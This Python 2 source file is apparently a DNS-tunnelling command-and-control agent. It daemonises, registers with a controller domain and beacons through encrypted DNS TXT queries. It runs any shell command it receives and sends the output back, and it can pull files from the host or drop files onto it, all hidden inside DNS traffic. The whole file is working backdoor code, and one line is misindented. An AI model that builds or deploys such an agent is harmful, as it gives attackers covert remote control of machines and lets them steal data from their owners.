import sys
sys.path.append('./lib/')
import dnslib
import time
from time import strftime
from datetime import datetime
import hashlib
import os
import base64
from os import fork, setsid, umask, dup2
from sys import stdin, stdout, stderr
import uuid
import random
import binascii
import logging
import string
from subprocess import Popen
from subprocess import PIPE
import socket

try:
    from subprocess import getoutput
except ImportError:
    from commands import getoutput

import binascii
import code
import pprint
import ConfigParser

from dnslib.dns import DNSRecord, DNSHeader, DNSQuestion, QTYPE
from dnslib.digparser import DigParser


"""
functions
"""


def registerAgent():
    logging.debug("registerAgent enter")
    # generate session encryption key
    GConfig['key'] = generateKey()
    logging.debug("Generated session key: %s" % binascii.hexlify(GConfig['key']))
    # sendmsg("RG", GConfig['key'])
    while(sendmsg("RG", GConfig['key']) == 0):
        logging.debug("Registration failed, retrying ...")
        time.sleep(5)

    logging.debug("registerAgent finish")

"""
encrypt message function
input: plain message
outupt: AES encrypted message
"""


def cryptmsg(message):
    logging.debug("cryptmsg enter")

    if GConfig['plain'] == 1:
        logging.debug("encryption disabled")
        encoded = base64.b64encode(message)
    else:
        # the block size for the cipher object; must be 16 per FIPS-197
        BLOCK_SIZE = 16

        # the character used for padding--with a block cipher such as AES, the value
        # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
        # used to ensure that your value is always a multiple of BLOCK_SIZE
        PADDING = '{'

        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

        # one-liners to encrypt/encode and decrypt/decode a string
        # encrypt with AES, encode with base64
        EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))

        # create a cipher object using the random secret
        # print GConfig['key']
        cipher = AES.new(GConfig['key'])

        # encode a string
        encoded = EncodeAES(cipher, message)
        logging.debug("cryptmsg finish")
    return encoded


def decryptmsg(message):
    logging.debug("decryptmsg enter")
    if GConfig['plain'] == 1:
        logging.debug("encryption disabled")
        decoded = base64.b64decode(message)
    else:
        # the block size for the cipher object; must be 16 per FIPS-197
        BLOCK_SIZE = 16

        # the character used for padding--with a block cipher such as AES, the value
        # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
        # used to ensure that your value is always a multiple of BLOCK_SIZE
        PADDING = '{'

        # one-liner to sufficiently pad the text to be encrypted
        pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

        # one-liners to encrypt/encode and decrypt/decode a string
        # encrypt with AES, encode with base64
        DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

        # create a cipher object using the random secret
        cipher = AES.new(GConfig['key'])

        # decode the encoded string
        decoded = DecodeAES(cipher, message)
        logging.debug("decryptmsg finish")
    return decoded


def generateKey():
    if GConfig['plain'] == 1:
        key = str("\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00")
    else:
        key = str(os.urandom(16))
    return key


def sendmsg(m_type, message=""):
    global MSGerror
    message = str(message)
    if len(message) == 0:
        message = "PING"
    logging.debug("sendmsg enter")

    port = 53
    timeout = 10
    i = 0
    part = ""
    c_msg = ""
    protohdr = ""
    dnsresponse = ""
    # dns params max size definition
    s_request = 255  # max size of the domain
    s_section = 127  # max size of the message
    s_dns_section = 63  # max size of the dns section
    s_protohdr = 50  # protocol max size headers - hostid + msg m_type + msgid
    GConfig['msgid'] = GConfig['msgid'] + 1

    if m_type == "RG":
        protohdr = str(GConfig['hostid']) + ";" + str(m_type) + ";" + str(GConfig['msgid'])
        logging.debug("protohdr: % s " % protohdr)
        c_protohdr = base64.b64encode(protohdr)
        logging.debug("base64 protohrd: %s " % c_protohdr)
        c_msg = base64.b64encode(message)
        logging.debug("base64 RG message: %s" % c_msg)
        dnsreq = c_protohdr
        for i_msg in range(0, (len(c_msg) / s_dns_section) + 1):
            dnsreq = dnsreq + "." + c_msg[i_msg * (s_dns_section):i_msg * (s_dns_section) + (s_dns_section)]

        dnsreq = dnsreq + "." + GConfig['domain']
        logging.debug("dns req: %s " % dnsreq)
        # Construct request
        q = DNSRecord(q=DNSQuestion(dnsreq, getattr(QTYPE, "TXT")))
        try:
            a_pkt = q.send(GConfig['dnsserver'], port, False, timeout)
            a = DNSRecord.parse(a_pkt).get_a()
            response = decryptmsg(string.split(str(a))[4])
        except:
            logging.debug("Registration failed!")
            return(0)
        logging.debug("response %s" % response)

        if response == "OK":
            logging.debug("Registration success!")
            return(1)
        else:
            logging.debug("Registration failed!")
            return(0)
    else:
        if s_request < s_section + s_protohdr + 10 + len(GConfig['domain']):
            logging.critical("ERROR: domain too long" + str(s_section + s_protohdr + 10 + len(GConfig['domain'])))
            exit(1)

        # chunk msq to s_section character pieces
        msgcount = (len(message) / s_section) + 1
        # encrypt every piece of message with protocol header
        logging.debug("MSGcount: " + str(msgcount))
        # proto header
        for i in range(0, msgcount):
            time.sleep(GConfig['beacontime'])
            protohdr = str(GConfig['hostid']) + ";" + str(m_type) + ";" + str(GConfig['msgid'])
            logging.debug("protohdr: % s " % protohdr)
            c_protohdr = base64.b64encode(protohdr)
            logging.debug("base64 protohrd: %s " % c_protohdr)
            part = (message[i * (s_section):i * (s_section) + (s_section)])
            logging.debug("send message: %s " % part)
            c_msg = cryptmsg(part)
            logging.debug("enc message: %s" % c_msg)
            dnsreq = c_protohdr
            for i_msg in range(0, (len(c_msg) / s_dns_section) + 1):
                dnsreq = dnsreq + "." + c_msg[i_msg * (s_dns_section):i_msg * (s_dns_section) + (s_dns_section)]

            dnsreq = dnsreq + "." + GConfig['domain']
            logging.debug("dns req: %s " % dnsreq)
            # Construct request
            q = DNSRecord(q=DNSQuestion(dnsreq, getattr(QTYPE, "TXT")))
            try:
                a_pkt = q.send(GConfig['dnsserver'], port, False, timeout)
                a = DNSRecord.parse(a_pkt).get_a()
                response = decryptmsg(string.split(str(a))[4])
            except:
                logging.debug("Sending request failed!")
                # pocitani chyb, pak zavolat znovy registraci
                MSGerror = MSGerror + 1
                logging.debug("MSGerror %i" % MSGerror)
                if MSGerror > GConfig['retry_error']:
                    logging.debug("New registration enforce due to retry error count")
                    MSGerror = 0
                    registerAgent()
                return(0)
            GConfig['msgid'] = GConfig['msgid'] + 1
            logging.debug("response %s" % response)

    logging.debug("sendmsg finish")
    return response


def recvmsg():
    logging.debug("recvmsg enter")


def generatehostid():
    logging.debug("hostid enter")
    GConfig['hostid'] = str(random.randrange(1000000)) + "-" + str('%08x' % uuid.uuid1().node)
    logging.debug("hostig %s " % GConfig['hostid'])


def save_file(file, buffer):
    logging.debug("saving file")
    fh = open(file, "wb")
    fh.write(buffer)
    fh.close()


def load_file(file):
    logging.debug("reading file to buffer")
    try:
        fh = open(file, "rb")
        buffer = fh.read()
        fh.close()
        return buffer
    except:
        return ""
"""
main()
"""

try:
    config = ConfigParser.RawConfigParser()
    config.read('./config/agent.cfg')
except:
    print "Cannot load configuration!"
    exit(1)

# parse configuration file
GConfig = {}
GConfig['domain'] = config.get('main', 'domain')
GConfig['beacontime'] = float(config.get('main', 'beacontime'))
GConfig['loglevel'] = config.get('main', 'loglevel')
GConfig['dnsserver'] = config.get('main', 'dnsserver')
GConfig['fork'] = int(config.get('main', 'fork'))
GConfig['logfile'] = config.get('main', 'logfile')
GConfig['plain'] = int(config.get('main', 'plain'))
GConfig['retry_error'] = int(config.get('main', 'retry_error'))
GConfig['msgid'] = 0

if GConfig['loglevel'] == "DEBUG":
    loglevel = logging.DEBUG
elif GConfig['loglevel'] == "INFO":
    loglevel = logging.INFO
elif GConfig['loglevel'] == "WARNING":
    loglevel = logging.WARNING
elif GConfig['loglevel'] == "ERROR":
    loglevel = logging.ERROR
elif GConfig['loglevel'] == "CRITICAL":
    loglevel = logging.CRITICAL
else:
    loglevel = logging.NOTSET

logging.basicConfig(filename=GConfig['logfile'], level=loglevel, format='%(asctime)s.%(msecs)d %(levelname)s %(funcName)s: %(message)s', datefmt="%Y-%m-%d %H:%M:%S")

logging.debug("home domain: " + str(GConfig['domain']))
logging.debug("beacon time: " + str(GConfig['beacontime']))
logging.debug("Log level: " + str(GConfig['loglevel']))
logging.debug("dnsserver: " + str(GConfig['dnsserver']))
logging.debug("fork: " + str(GConfig['fork']))
logging.debug("logfile: " + str(GConfig['logfile']))
logging.debug("plain: " + str(GConfig['plain']))

# fork
if GConfig['fork'] == 1:
    print "daemonizing ..."
    if fork():
        exit(0)
    umask(0)
    setsid()
    if fork():
        exit(0)

    stdout.flush()
    stderr.flush()
    si = file('/dev/null', 'r')
    so = file('/dev/null', 'a+')
    se = file('/dev/null', 'a+', 0)
    dup2(si.fileno(), stdin.fileno())
    dup2(so.fileno(), stdout.fileno())
    dup2(se.fileno(), stderr.fileno())

if GConfig['plain'] == 0:
    from Crypto.Cipher import AES

MSGerror = 0

generatehostid()
registerAgent()

while (1):
    logging.debug("Sleeping for %s s" % str(GConfig['beacontime']))
    time.sleep(GConfig['beacontime'])
    # ping for command
    command = sendmsg("RC")
    # print command
    a_cmd = string.split(str(command), " ")
    if command == "NOP":
        logging.debug("noting to do")
        continue
    elif command == "ASHUTDOWN":
        logging.info("Shutting down agent due to send command!")
        exit(0)
    elif command == "AGENTID":
        id = os.getuid()
        sendmsg("ID", str(id))
        continue
    elif command == "AGENTIP":
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 0))
        sendmsg("IP", str(s.getsockname()[0]))
        continue
    elif a_cmd[0] == "BEACONTIME" and len(a_cmd[1]) > 0:
        GConfig['beacontime'] = float(a_cmd[1])
        logging.info("beacontime changed to %s" % str(a_cmd[1]))
        continue
    elif a_cmd[0] == "cd" and len(a_cmd[1]) > 0:
        os.chdir(a_cmd[1])
        logging.info("PWD changed to %s" % str(a_cmd[1]))
        output = "pwd: %s " % a_cmd[1]
        sendmsg("SM", output)
        continue
    elif a_cmd[0] == "upload" and len(a_cmd[1]) > 0 and int(a_cmd[2]) > 0:
        logging.info("Uploading file %s to agent with %i chunks" % (str(a_cmd[1]), int(a_cmd[2])))
        fbuffer = []
        resp = ""
        counter = 0
        while(counter < int(a_cmd[2]) + 1):
            fbuffer.insert(counter, str(resp))
            resp = sendmsg("UP", counter)
            counter = counter + 1
            time.sleep(GConfig['beacontime'])
        f_file = string.split(a_cmd[1], "/")[-1]
        f_buffer = string.join(fbuffer, "")
        logging.debug("Receive buffer: %s" % f_buffer)
        save_file(f_file, f_buffer)
        continue
    elif a_cmd[0] == "download" and len(a_cmd[1]) > 0:
        logging.info("Downloading file %s from agent" % str(a_cmd[1]))
        f_buffer = load_file(a_cmd[1])
        if len(f_buffer) > 0:
            sendmsg("SD", len(f_buffer))
            sendmsg("DL", f_buffer)
            sendmsg("FD", string.split(a_cmd[1], "/")[-1])
        else:
            sendmsg("SM", "Error file doesnt exists!")
        continue
    else:
        logging.debug("Command from master %s " % command)
    # execute command
    mode = "shell=True"
    # (child_stdin, child_stdout, child_stderr) = os.popen3(command, mode, 0)
    try:
        p = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=True)
        # p.communicate()
				p.wait()
        (child_stdin, child_stdout, child_stderr) = (p.stdin, p.stdout, p.stderr)
        output = child_stderr.read() + child_stdout.read()
        sendmsg("SM", output)
    except:
        continue
